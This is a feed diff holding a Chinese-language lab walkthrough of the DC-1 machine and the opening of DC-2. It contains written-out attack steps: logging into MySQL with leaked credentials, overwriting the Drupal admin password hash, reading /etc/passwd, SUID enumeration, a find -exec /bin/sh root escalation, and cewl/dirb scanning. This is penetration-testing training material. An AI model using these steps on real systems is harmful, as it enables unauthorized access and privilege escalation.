+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/17d7d7218132493c8896076f003cb3b5.png&#34;
+	width=&#34;1056&#34;
+	height=&#34;855&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/17d7d7218132493c8896076f003cb3b5_hu10814957263974967113.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/17d7d7218132493c8896076f003cb3b5_hu1648977990327444906.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;123&#34;
+		data-flex-basis=&#34;296px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;flag2&#34;&gt;flag2
+&lt;/h2&gt;&lt;p&gt;在其文件中发现flag2和数据库账号密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/8264c1500cd244deb07ccfaca971d2b5.png&#34;
+	width=&#34;909&#34;
+	height=&#34;670&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/8264c1500cd244deb07ccfaca971d2b5_hu13729077838431376427.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/8264c1500cd244deb07ccfaca971d2b5_hu5156422261886193812.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;135&#34;
+		data-flex-basis=&#34;325px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;flag3&#34;&gt;flag3
+&lt;/h2&gt;&lt;p&gt;进入数据库&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql -udbuser -pR0ck3t
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/3c81aa073b1e4ba5bff1350b16998598.png&#34;
+	width=&#34;986&#34;
+	height=&#34;391&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/3c81aa073b1e4ba5bff1350b16998598_hu1121978028286908927.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/3c81aa073b1e4ba5bff1350b16998598_hu10948255851711147548.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;252&#34;
+		data-flex-basis=&#34;605px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;查看数据库&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/42b16a37fac94e18b088869bf9aa710c.png&#34;
+	width=&#34;397&#34;
+	height=&#34;244&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/42b16a37fac94e18b088869bf9aa710c_hu17251630375236750763.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/42b16a37fac94e18b088869bf9aa710c_hu6135200414120144283.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;162&#34;
+		data-flex-basis=&#34;390px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​编辑&lt;/p&gt;
+&lt;p&gt;使用drupaldb这个库并查看其所有的表&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/49e52f1569de4070bc8c02a7103e5f24.png&#34;
+	width=&#34;820&#34;
+	height=&#34;1014&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/49e52f1569de4070bc8c02a7103e5f24_hu15285816500054907870.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/49e52f1569de4070bc8c02a7103e5f24_hu15408931682821148108.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;80&#34;
+		data-flex-basis=&#34;194px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;查看user表的数据, 可以看到加密后的密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SDvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/83de4d20ebd84143b19f55a295e90e07.png&#34;
+	width=&#34;1030&#34;
+	height=&#34;864&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/83de4d20ebd84143b19f55a295e90e07_hu1782704451414778733.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/83de4d20ebd84143b19f55a295e90e07_hu8936350400565160262.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;119&#34;
+		data-flex-basis=&#34;286px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;发现密码是加密的，drupal中加密脚本在/var/www/script目录下的/password-hash.sh 用加密脚本写一个密码，然后去替换数据库中的密码值&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/90374e60819e4be0a74b7bc0401ec890.png&#34;
+	width=&#34;916&#34;
+	height=&#34;162&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/90374e60819e4be0a74b7bc0401ec890_hu18034328966631033251.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/90374e60819e4be0a74b7bc0401ec890_hu16354909207628125.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;565&#34;
+		data-flex-basis=&#34;1357px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;还真有，这就好办了，直接设置密码生成明文123456然后进行密文替换就好了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php scripts/password-hash.sh 123456
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/768ec793ef3d4aedb0472394c344c733.png&#34;
+	width=&#34;1170&#34;
+	height=&#34;131&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/768ec793ef3d4aedb0472394c344c733_hu1203716401604027091.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/768ec793ef3d4aedb0472394c344c733_hu17144604922965271036.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;893&#34;
+		data-flex-basis=&#34;2143px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;进入mysql数据库，替换admin对应的密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;update drupaldb.users set pass=&amp;#39;$S$DNi3rZe1FTcrFGWf7hi1XDhGjut5he6qHCCNidUj4lNk9VYDozbp&amp;#39; where name=&amp;#39;admin&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/dc3b4a19987845789ce8e66c5f3a7892.png&#34;
+	width=&#34;1408&#34;
+	height=&#34;115&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/dc3b4a19987845789ce8e66c5f3a7892_hu3434932138230289545.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/dc3b4a19987845789ce8e66c5f3a7892_hu16402291093592669581.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1224&#34;
+		data-flex-basis=&#34;2938px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;成功替换密码，然后进行登录得到flag3&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/437fee588df94b1e828edc032d5b55c8.png&#34;
+	width=&#34;2092&#34;
+	height=&#34;1203&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/437fee588df94b1e828edc032d5b55c8_hu14640193374900177796.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/437fee588df94b1e828edc032d5b55c8_hu1719436486953401968.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;173&#34;
+		data-flex-basis=&#34;417px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;flag4&#34;&gt;flag4
+&lt;/h2&gt;&lt;p&gt;Special PERMS will help FIND the passwd - but you&amp;rsquo;ll need to -exec that command to work out how to get what&amp;rsquo;s in the shadow.&lt;/p&gt;
+&lt;p&gt;Flag3提示词有&lt;code&gt;perms、find、-exec、shadow&lt;/code&gt;共四个特殊提示词&lt;/p&gt;
+&lt;p&gt;提示看一下shadow&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/888b9ccdfbd34c1c8df1d75ed59875da.png&#34;
+	width=&#34;460&#34;
+	height=&#34;89&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/888b9ccdfbd34c1c8df1d75ed59875da_hu13304597419200458546.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/888b9ccdfbd34c1c8df1d75ed59875da_hu14893656905373678621.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;516&#34;
+		data-flex-basis=&#34;1240px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​编辑&lt;/p&gt;
+&lt;p&gt;无权访问 看一下密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f280bc83465a4232b596887ef6d6999d.png&#34;
+	width=&#34;727&#34;
+	height=&#34;776&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f280bc83465a4232b596887ef6d6999d_hu8234224809545807040.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/f280bc83465a4232b596887ef6d6999d_hu2468431672806838795.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;93&#34;
+		data-flex-basis=&#34;224px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h1 id=&#34;三提权&#34;&gt;三.提权
+&lt;/h1&gt;&lt;h2 id=&#34;suid提权&#34;&gt;suid提权
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / -user root -perm -4000 -exec ls -ldb {} \;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/c138e3a661c94c52b8b96863bb9dc9cb.png&#34;
+	width=&#34;902&#34;
+	height=&#34;587&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/c138e3a661c94c52b8b96863bb9dc9cb_hu3086194765597340292.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/c138e3a661c94c52b8b96863bb9dc9cb_hu10207335550814874529.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;153&#34;
+		data-flex-basis=&#34;368px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;flag5&#34;&gt;flag5
+&lt;/h2&gt;&lt;p&gt;使用find命令提权&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find ./ aaa -exec &amp;#39;/bin/sh&amp;#39; \;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/30d041349eed44f2a83404993a416768.png&#34;
+	width=&#34;967&#34;
+	height=&#34;454&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/30d041349eed44f2a83404993a416768_hu17363125153562022214.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/30d041349eed44f2a83404993a416768_hu3404257812865346514.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;212&#34;
+		data-flex-basis=&#34;511px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;成功拿下&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>DC-2</title>
+        <link>https://dxlaboratory.github.io/p/test2-chinese/</link>
+        <pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://dxlaboratory.github.io/p/test2-chinese/</guid>
+        <description>&lt;h1 id=&#34;前言&#34;&gt;前言
 &lt;/h1&gt;&lt;hr&gt;
 &lt;blockquote&gt;
 &lt;p&gt;与 DC-1 非常相似，DC-2 是另一个专门建造的易受攻击实验室，目的是获得渗透测试领域的经验。
@@ -33,10 +913,10 @@
 （下载慢，放到迅雷里面）&lt;/p&gt;
 &lt;h2 id=&#34;vmware环境配置&#34;&gt;VMware环境配置
 &lt;/h2&gt;&lt;p&gt;必须是NAT模式，且攻击机也是NAT模式&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47.png&#34;
 	width=&#34;1105&#34;
 	height=&#34;271&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu15866109228737243187.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu6299938560519909588.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu15866109228737243187.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu6299938560519909588.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47&#34;
@@ -118,10 +998,10 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;flag1&#34;&gt;flag1
 &lt;/h2&gt;&lt;p&gt;打开页面发现flag标志&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0.png&#34;
 	width=&#34;994&#34;
 	height=&#34;574&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu14232903875567318267.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu7079742860394796661.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu14232903875567318267.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu7079742860394796661.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -145,10 +1025,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cewl http://dc-2 -w passwd.txt
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3.png&#34;
 	width=&#34;348&#34;
 	height=&#34;577&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu9462413550411062395.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu16018118924427410528.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu9462413550411062395.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu16018118924427410528.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -166,10 +1046,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dirb http://dc-2 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde.png&#34;
